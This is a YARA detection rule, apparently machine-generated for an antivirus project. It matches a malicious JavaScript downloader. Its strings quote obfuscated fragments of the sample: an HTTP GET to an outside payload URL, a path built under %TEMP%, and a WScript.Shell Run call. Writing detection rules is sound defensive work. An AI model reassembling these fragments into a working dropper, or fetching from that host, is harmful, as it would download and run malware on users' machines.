rule sig_20160427_1a316f894e1cf225dfd7dfd4779aeeb3 {
  meta:
    description = "datamaliciousorder - file 20160427_1a316f894e1cf225dfd7dfd4779aeeb3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "093f3fa00bf7c539c1ecb63a558e3c76b92626e4c577add2878593a142a9f9a3"

  strings:
    $s1  = "FeuhdCpirc[LdvdxGcrcy](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s2  = "function BkqdgWvamj() {return QwfeuCfsjo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"wBDdrTP" ascii
    $s3  = "function BkqdgWvamj() {return QwfeuCfsjo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"wBDdrTP" ascii
    $s4  = "if (FeuhdCpirc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BpjfpYmiqg(QttvoLkizp, ZiusnNumpo){SdlpoXvpwk = SdlpoXvpwk * 1; return QttvoLkizp - ZiusnNumpo;};" fullword ascii
    $s6  = "var QwfeuCfsjo = function FtcjvVzxcj() {return TqckwIycue[OfyrrXzqqa](\"WScript\"+\".Shell\");}(), GuomzXmueh = 11;" fullword ascii
    $s7  = "var TqckwIycue = this[\"WScript\"];" fullword ascii
    $s8  = "function KdhsmWwrei(){return MbudbRkbvs + \"\";};" fullword ascii
    $s9  = "function DycohCgroz() {return ((JvtqjYsxvz == true) && (JvtqjYsxvz == IzreoKgfmx)) ? 1 : SdlpoXvpwk;};" fullword ascii
    $s10 = "var IzreoKgfmx = false;" fullword ascii
    $s11 = "CntqvAcssg = true;" fullword ascii
    $s12 = "function AzkhpGaiih()" fullword ascii
    $s13 = "function MdpefQeoza(){return OfyrrXzqqa;};" fullword ascii
    $s14 = "function UpwucBujoz(JgnptNkplk){QwfeuCfsjo[\"R\"+\"un\"](JgnptNkplk, SdlpoXvpwk, SdlpoXvpwk);};" fullword ascii
    $s15 = "}while (RukcoKcrzc);" fullword ascii
    $s16 = "var JvtqjYsxvz = false;" fullword ascii
    $s17 = "return BpjfpYmiqg(MhtekIsjfa, BasxgLmtdx);" fullword ascii
    $s18 = "var ZmziwRzpvj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function CqstgMcggy(){return 23;};" fullword ascii
    $s20 = "IzreoKgfmx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}